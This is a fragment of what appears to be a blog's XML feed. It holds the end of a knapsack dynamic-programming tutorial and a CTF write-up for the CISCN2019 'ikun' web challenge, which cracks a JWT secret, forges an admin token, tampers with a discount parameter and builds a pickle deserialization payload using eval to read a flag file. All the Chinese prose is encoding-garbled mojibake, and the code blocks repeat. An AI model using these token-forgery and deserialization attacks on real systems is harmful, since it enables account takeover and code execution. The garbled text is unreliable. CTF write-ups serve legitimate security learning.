·çš„ï¼ŒåŒºåˆ«åœ¨äºå®Œå…¨èƒŒåŒ…çš„ç‰©å“å¯ä»¥é‡å¤è£…å…¥ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªç‰©å“æœ‰æ— é™ä¸ªï¼Œä¾ç„¶æ±‚æ€ä¹ˆè£…ç‰©å“èƒ½ä½¿æƒé‡æœ€å¤§</p><h3 id="ä¾‹é¢˜1-1"><a href="#ä¾‹é¢˜1-1" class="headerlink" title="ä¾‹é¢˜1"></a>ä¾‹é¢˜1</h3><p>ä¸Šé¢˜<br><img src="/LawlietLW.github.io/2020/02/10/dong-tai-gui-hua/1.jpg" alt=""><br>å…¸å‹çš„å®Œå…¨èƒŒåŒ…ï¼ŒèƒŒåŒ…å®¹é‡æ¢æˆäº†æ—¶é—´ï¼Œç‰©å“å°±æ˜¯è¯å“ã€‚<br>è¿˜æ˜¯å…ˆç¡®å®šdpæ•°ç»„çš„å«ä¹‰ï¼Œä¸è¿‡è¿™é¢˜ä¸èƒ½ç”¨äºŒç»´æ•°ç»„äº†ï¼Œiå’Œjéƒ½å¯ä»¥è¾¾åˆ°10000ï¼Œæ—¶é—´ä¼šçˆ†çš„ï¼Œæ‰€ä»¥åªèƒ½ç”¨ä¸€ç»´æ•°ç»„<br>é‚£ä¹ˆdp[i]çš„å®šä¹‰å°±ä¸ºå½“æ—¶é—´å‰©ä½™iæ—¶ï¼Œä¸”ç¬¬iç§è¯è¿˜æ²¡æœ‰é‡‡æ—¶(ç¬¬iç§è¯å¯ä»¥æ— é™æ¬¡é‡‡æ‘˜)æ‰€é‡‡çš„è¯çš„æœ€å¤§ä»·å€¼</p><p>ç¬¬äºŒæ­¥æ±‚é€’æ¨å…¬å¼<br>å¯¹ç¬¬iç§è‰è¯æˆ‘ä»¬æœ‰é‡‡å’Œä¸é‡‡ä¸¤ç§é€‰æ‹©ï¼Œå¦‚æœé€‰æ‹©é‡‡çš„è¯ï¼Œé‚£ä¹ˆ<code>dp[i]=dp[i-a[i]]+v[i]</code><br>ä¸é‡‡çš„è¯<code>dp[i]=dp[i]</code>ï¼Œç»¼åˆä¸¤ç§æƒ…å†µæ¥çœ‹ï¼Œ<code>dp[i]=max(dp[i-a[i]]+v[i],dp[i])</code></p><p>åœ¨å‰é¢çš„01èƒŒåŒ…ä¸­ï¼Œæˆ‘ä»¬æ˜¯ä»åå¾€å‰éå†ç‰©å“çš„ä»·å€¼ï¼Œä½†å®Œå…¨èƒŒåŒ…ä¸ä¸€æ ·ï¼Œå®Œå…¨èƒŒåŒ…è¦ç´¯è®¡åŒä¸€ä¸ªç‰©å“çš„ä»·å€¼å¤šæ¬¡ï¼Œå®Œå…¨èƒŒåŒ…çš„å‰ä¸€ä¸ªçŠ¶æ€å¯èƒ½ä¾ç„¶æ˜¯ç´¯åŠ å®ŒåŒä¸€ä¸ªç‰©å“åçš„çŠ¶æ€<br>ä»å‰å¾€åæ›´æ–°ï¼Œæˆ‘ä»¬é€‰æ‹©çš„æ˜¯æ ¹æ®å½“å‰çš„çŠ¶æ€å€¼æ¥æ›´æ–°æœ¬æ¬¡çš„ç»“æœï¼Œä»åå¾€å‰æ›´æ–°ï¼Œæˆ‘ä»¬é€‰æ‹©çš„æ˜¯æ ¹æ®ä¸Šä¸€æ¬¡çš„çŠ¶æ€å€¼æ¥æ›´æ–°æœ¬æ¬¡çš„ç»“æœ<br>01èƒŒåŒ…æ˜¯æ ¹æ®ä¸Šä¸€æ¬¡çš„çŠ¶æ€å€¼æ¥æ›´æ–°çš„ï¼Œdp[i]ä¸dp[i-1]æœ‰å…³<br>å®Œå…¨èƒŒåŒ…çš„äºŒç»´æ•°ç»„ä¸º:<code>f[i][j] = max(f[i-1][j], f[i][j - weight[i]] + value[i])</code><br>ç”±äºä¸€ä¸ªç‰©å“å¯ä»¥è¢«é€‰æ‹©å¤šæ¬¡ï¼Œæ›´æ–°f[i][j]æ—¶ï¼Œf[i][j- weight[i]]å¯èƒ½å› ä¸ºæ”¾å…¥ç‰©å“iè€Œå‘ç”Ÿå˜åŒ–ã€‚</p><p>æ•´ä½“ä»£ç å¦‚ä¸‹</p><figure class="hljs highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre class=" language-hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdio&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">int</span> T,M,t[<span class="hljs-number">100001</span>],v[<span class="hljs-number">100001</span>],dp[<span class="hljs-number">100000</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><br></span>{<br>    <span class="hljs-keyword">int</span> ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;T&gt;&gt;M;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=M;i++)<br>        <span class="hljs-built_in">cin</span>&gt;&gt;t[i]&gt;&gt;v[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=M;i++)<br>    {<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=t[i];j&lt;=T;j++)<br>        {<br>            dp[j]=<span class="hljs-built_in">max</span>(dp[j-t[i]]+v[i],dp[j]);<br>        }<br>    }<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=T;i++)<span class="hljs-comment">//è¦ä»æ‰€æœ‰å€¼ä¸­æ‰¾å‡ºæœ€å¤§å€¼</span><br>    {<br>        ans=<span class="hljs-built_in">max</span>(ans,dp[i]);<br>    }<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>,ans);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number"><code class="language-hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdio&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">int</span> T,M,t[<span class="hljs-number">100001</span>],v[<span class="hljs-number">100001</span>],dp[<span class="hljs-number">100000</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><br></span>{<br>    <span class="hljs-keyword">int</span> ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;T&gt;&gt;M;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=M;i++)<br>        <span class="hljs-built_in">cin</span>&gt;&gt;t[i]&gt;&gt;v[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=M;i++)<br>    {<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=t[i];j&lt;=T;j++)<br>        {<br>            dp[j]=<span class="hljs-built_in">max</span>(dp[j-t[i]]+v[i],dp[j]);<br>        }<br>    }<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=T;i++)<span class="hljs-comment">//è¦ä»æ‰€æœ‰å€¼ä¸­æ‰¾å‡ºæœ€å¤§å€¼</span><br>    {<br>        ans=<span class="hljs-built_in">max</span>(ans,dp[i]);<br>    }<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>,ans);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>ä»Šå¤©å°±å…ˆè®°å½•è¿™ä¹ˆå¤šï¼Œä»¥åæœ‰æ—¶é—´åœ¨è®°å½•</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŠ¨æ€è§„åˆ’ </tag>
            
            <tag> C </tag>
            
            <tag> èƒŒåŒ…é—®é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</title>
      <link href="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/"/>
      <url>/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œå–œé—»ä¹è§<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/1.jpg" alt=""><br>å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/3.jpg" alt=""><br>ç„¶åæ‰¾ä¸€æ‰¾ä¿¡æ¯<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/2.jpg" alt=""><br>è¦æ‰¾åˆ°lv6<br>å¾€ä¸‹ç¿»äº†å‡ é¡µï¼Œå¥½æƒ³æŒºå¤šé¡µçš„æ ·å­ï¼Œæ‰‹å·¥æ‰¾ä¸å‡ºæ¥ï¼Œå†™ä¸ªè„šæœ¬å§</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">"http://63d2c3fa-95be-449a-afe2-1e07c97c0013.node3.buuoj.cn/shop?page=%d"</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>    u = url % i<br>    print(<span class="hljs-string">"æ­£åœ¨æµ‹è¯•ç¬¬%dé¡µ"</span>%i)<br>    r = requests.get(u)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">'lv6.png'</span> <span class="hljs-keyword">in</span> r.text:<br>        print(<span class="hljs-string">"lv6åœ¨ç¬¬%dé¡µ"</span>%i)<br>        <span class="hljs-keyword"><code class="language-hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">"http://63d2c3fa-95be-449a-afe2-1e07c97c0013.node3.buuoj.cn/shop?page=%d"</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>    u = url % i<br>    print(<span class="hljs-string">"æ­£åœ¨æµ‹è¯•ç¬¬%dé¡µ"</span>%i)<br>    r = requests.get(u)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">'lv6.png'</span> <span class="hljs-keyword">in</span> r.text:<br>        print(<span class="hljs-string">"lv6åœ¨ç¬¬%dé¡µ"</span>%i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/4.jpg" alt=""><br>æ‰¾åˆ°lv6åœ¨181é¡µ<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/5.jpg" alt=""><br>è´­ä¹°<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/6.jpg" alt=""><br>å¥½åƒä¹°ä¸èµ·çš„æ ·å­<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/7.jpg" alt=""><br>æœç„¶ä¹°ä¸èµ·<br>é‚£å¼€ç€burpçœ‹çœ‹è¯·æ±‚<br>æ³¨æ„åˆ°æœ‰ä¸€ä¸ªdiscountæŠ˜æ‰£å­—æ ·<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/8.jpg" alt=""><br>é‚£æŠŠæŠ˜æ‰£æ”¹æˆ0è¯•ä¸€ä¸‹<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/9.jpg" alt=""><br>æ“ä½œå¤±è´¥<br>é‚£æŠŠæŠ˜æ‰£æ”¹ä¸ºä¸ä¸º0çš„å¾ˆå°çš„æ•°å­—è¯•è¯•<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/10.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/11.jpg" alt=""><br>è´­ä¹°æˆåŠŸåˆ°äº†å¦ä¸€ä¸ªé¡µé¢ï¼Œæ˜¾ç¤ºåªå…è®¸adminè®¿é—®<br>å¯èƒ½å’Œcookieä¹‹ç±»çš„æœ‰å…³ï¼Œå†æ¬¡è®¿é—®æŠ“åŒ…<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/12.jpg" alt=""><br>æ³¨æ„åˆ°æœ‰ä¸€ä¸ªJWTå­—æ®µ</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">Json web token (JWT), æ˜¯ä¸ºäº†åœ¨ç½‘ç»œåº”ç”¨ç¯å¢ƒé—´ä¼ é€’å£°æ˜è€Œæ‰§è¡Œçš„ä¸€ç§åŸºäºJSONçš„å¼€æ”¾æ ‡å‡†ï¼ˆ(RFC 7519).è¯¥tokenè¢«è®¾è®¡ä¸ºç´§å‡‘ä¸”å®‰å…¨çš„ï¼Œç‰¹åˆ«é€‚ç”¨äºåˆ†å¸ƒå¼ç«™ç‚¹çš„å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰åœºæ™¯ã€‚JWTçš„å£°æ˜ä¸€èˆ¬è¢«ç”¨æ¥åœ¨èº«ä»½æä¾›è€…å’ŒæœåŠ¡æä¾›è€…é—´ä¼ é€’è¢«è®¤è¯çš„ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œä»¥ä¾¿äºä»èµ„æºæœåŠ¡å™¨è·å–èµ„æºï¼Œä¹Ÿå¯ä»¥å¢åŠ ä¸€äº›é¢å¤–çš„å…¶å®ƒä¸šåŠ¡é€»è¾‘æ‰€å¿…é¡»çš„å£°æ˜ä¿¡æ¯ï¼Œè¯¥tokenä¹Ÿå¯ç›´æ¥è¢«ç”¨äºè®¤è¯ï¼Œä¹Ÿå¯è¢«åŠ å¯†<br></code></pre></td></tr></tbody></table></figure><p>ä¸€ç§tokenï¼Œç”¨æ¥è®¤è¯çš„</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">JWTçš„æ„æˆ<br>ç¬¬ä¸€éƒ¨åˆ†æˆ‘ä»¬ç§°å®ƒä¸ºå¤´éƒ¨ï¼ˆheader),ç¬¬äºŒéƒ¨åˆ†æˆ‘ä»¬ç§°å…¶ä¸ºè½½è·ï¼ˆpayload, ç±»ä¼¼äºé£æœºä¸Šæ‰¿è½½çš„ç‰©å“)ï¼Œç¬¬ä¸‰éƒ¨åˆ†æ˜¯ç­¾è¯ï¼ˆsignature).<br></code></pre></td></tr></tbody></table></figure><p>æ•´ä½“å°±å·®ä¸å¤šæ˜¯è¿™æ ·<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/13.jpg" alt=""><br>ä¸è¿‡JWTå¯ä»¥ç ´è§£ï¼Œpythonä¸­çš„pyjwtæ¨¡å—ç­‰ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ç”¨<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a>è¿™ä¸ªå·¥å…·ç ´è§£<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/14.jpg" alt=""><br>ç ´è§£å¾ˆå¿«ï¼ŒåŠ å¯†å¯†é’¥å°±æ˜¯1Kun<br>ç„¶åæˆ‘ä»¬åˆ°è¿™ä¸ªç½‘ç«™å»è¿›è¡Œåœ¨çº¿åŠ å¯†<a href="https://jwt.io/" target="_blank" rel="noopener"></a><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/15.jpg" alt=""><br>æŠŠå¯†é’¥æ›¿æ¢ä¸º1Kunï¼Œç”¨æˆ·åæ›¿æ¢ä¸ºadminï¼Œå°†æ–°çš„JWTæ›¿æ¢åˆ°æˆ‘ä»¬çš„è¯·æ±‚ä¿¡æ¯å½“ä¸­<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/16.jpg" alt=""><br>æˆåŠŸä»¥adminèº«ä»½ç™»å½•<br>æŸ¥çœ‹é¡µé¢æºä»£ç <br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/17.jpg" alt=""><br>å‘ç°äº†ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œä¸‹è½½æ¥çœ‹çœ‹<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/18.jpg" alt=""><br>æ˜¯è¿™ä¸ªç½‘ç«™çš„æºä»£ç <br>åˆåˆ°äº†å¤´ç–¼çš„ä»£ç å®¡è®¡ç¯èŠ‚ã€‚ã€‚ã€‚<br>æŒ¨ä¸ªæŒ¨ä¸ªçœ‹å§</p><hr><p>å¥½å§å®åœ¨å®¡ä¸æ¥ï¼Œçœ‹wpå§<br>æœ‰ä¸€ä¸ªpythonååºåˆ—åŒ–æ¼æ´ï¼Œåœ¨Admin.py </p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminHandler</span><span class="hljs-params">(BaseHandler)</span>:</span><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(self, *args, **kwargs)</span>:</span><br>        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">"admin"</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'no_ass.html'</span>)<br><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span><span class="hljs-params">(self, *args, **kwargs)</span>:</span><br>        <span class="hljs-keyword">try</span>:<br>            become = self.get_argument(<span class="hljs-string">'become'</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=p, member=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number"><code class="language-hljs python"><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminHandler</span><span class="hljs-params">(BaseHandler)</span>:</span><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(self, *args, **kwargs)</span>:</span><br>        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">"admin"</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'no_ass.html'</span>)<br><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span><span class="hljs-params">(self, *args, **kwargs)</span>:</span><br>        <span class="hljs-keyword">try</span>:<br>            become = self.get_argument(<span class="hljs-string">'become'</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=p, member=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)<br></code></pre></td></tr></tbody></table></figure><p>æ¼æ´ä»£ç å‡ºç°åœ¨è¿™é‡Œ</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs python">become = self.get_argument(<span class="hljs-string"><code class="language-hljs python">become = self.get_argument(<span class="hljs-string">'become'</span>)<br>p = pickle.loads(urllib.unquote(become))<br></code></pre></td></tr></tbody></table></figure><p>å…³äºpythonååºåˆ—åŒ–æ¼æ´å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« <a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ Python ååºåˆ—åŒ–æ¼æ´</a></p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">å½“åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ä¸­ç¢°åˆ°ä¸€æ— æ‰€çŸ¥çš„æ‰©å±•ç±»å‹(è¿™é‡ŒæŒ‡çš„å°±æ˜¯æ–°å¼ç±»)çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡ç±»ä¸­å®šä¹‰çš„__reduce__æ–¹æ³•æ¥å‘ŠçŸ¥å¦‚ä½•è¿›è¡Œåºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–<br>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ï¼Œåªè¦åœ¨æ–°å¼ç±»ä¸­å®šä¹‰ä¸€ä¸ª __reduce__ æ–¹æ³•ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨åºåˆ—åŒ–çš„ä½¿ç”¨è®©è¿™ä¸ªç±»æ ¹æ®æˆ‘ä»¬åœ¨__reduce__ ä¸­æŒ‡å®šçš„æ–¹å¼è¿›è¡Œåºåˆ—åŒ–ï¼Œé‚£è¿™å°±éå¸¸å¥½ï¼Œé‚£æˆ‘ä»¬è¯¥å¦‚ä½•æŒ‡å®šå‘¢ï¼Ÿå®é™…ä¸Šå…³é”®å°±åœ¨è¿™ä¸ªæ–¹æ³•çš„è¿”å›å€¼ä¸Šï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥è¿”å›ä¸¤ç§ç±»å‹çš„å€¼ï¼ŒString å’Œ tuple ,æˆ‘ä»¬çš„æ„é€ ç‚¹å°±åœ¨ä»¤å…¶è¿”å› tuple çš„æ—¶å€™<br><br>å½“ä»–è¿”å›å€¼æ˜¯ä¸€ä¸ªå…ƒç¥–çš„æ—¶å€™ï¼Œå¯ä»¥æä¾›2åˆ°5ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬é‡ç‚¹åˆ©ç”¨çš„æ˜¯å‰ä¸¤ä¸ªï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªcallable object(å¯è°ƒç”¨çš„å¯¹è±¡)ï¼Œç¬¬äºŒä¸ªå‚æ•°å¯ä»¥æ˜¯ä¸€ä¸ªå…ƒç¥–ä¸ºè¿™ä¸ªå¯è°ƒç”¨å¯¹è±¡æä¾›å¿…è¦çš„å‚æ•°ï¼Œå¦‚æœä½ è®¤çœŸçœ‹ä¸Šé¢çš„ PVM çš„æŒ‡ä»¤ç ï¼Œä½ å°±ä¼šå‘ç°è¿™ä¸ªè¿”å›å€¼å’Œå…¶ä¸­çš„ä¸€ä¸ª R æŒ‡ä»¤éå¸¸çš„ä¸€è‡´ï¼Œï¼ˆæˆ‘çŒœæµ‹è¿™ä¸ª R æŒ‡ä»¤ç å°±æ˜¯è¿™ä¸ª __reduce__ æ–¹æ³•çš„è¿”å›å€¼çš„åº•å±‚å®ç° ï¼‰<br></code></pre></td></tr></tbody></table></figure><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">urllib.unquote()<br>å­—ç¬¦ä¸²è¢«å½“ä½œurlæäº¤æ—¶ä¼šè¢«è‡ªåŠ¨è¿›è¡Œurlç¼–ç å¤„ç†<br>pickle.dump(obj, file[, protocol])<br>åºåˆ—åŒ–å¯¹è±¡ï¼Œå¹¶å°†ç»“æœæ•°æ®æµå†™å…¥åˆ°æ–‡ä»¶å¯¹è±¡ä¸­ã€‚å‚æ•°protocolæ˜¯åºåˆ—åŒ–æ¨¡å¼ï¼Œé»˜è®¤å€¼ä¸º0ï¼Œè¡¨ç¤ºä»¥æ–‡æœ¬çš„å½¢å¼åºåˆ—åŒ–ã€‚protocolçš„å€¼è¿˜å¯ä»¥æ˜¯1æˆ–2ï¼Œè¡¨ç¤ºä»¥äºŒè¿›åˆ¶çš„å½¢å¼åºåˆ—åŒ–ã€‚<br>pickle.load(file)<br>ååºåˆ—åŒ–å¯¹è±¡ã€‚å°†æ–‡ä»¶ä¸­çš„æ•°æ®è§£æä¸ºä¸€ä¸ªPythonå¯¹è±¡ã€‚<br></code></pre></td></tr></tbody></table></figure><p>expå¦‚ä¸‹(è¦åœ¨python2ä¸‹è¿è¡Œ)</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span><span class="hljs-params">(object)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span><span class="hljs-params">(self)</span>:</span><br>       <span class="hljs-keyword">return</span> (eval, (<span class="hljs-string">"open('/flag.txt','r').read()"</span>,))<br><br>a = pickle.dumps(payload())<br>a = urllib.quote(a)<br><span 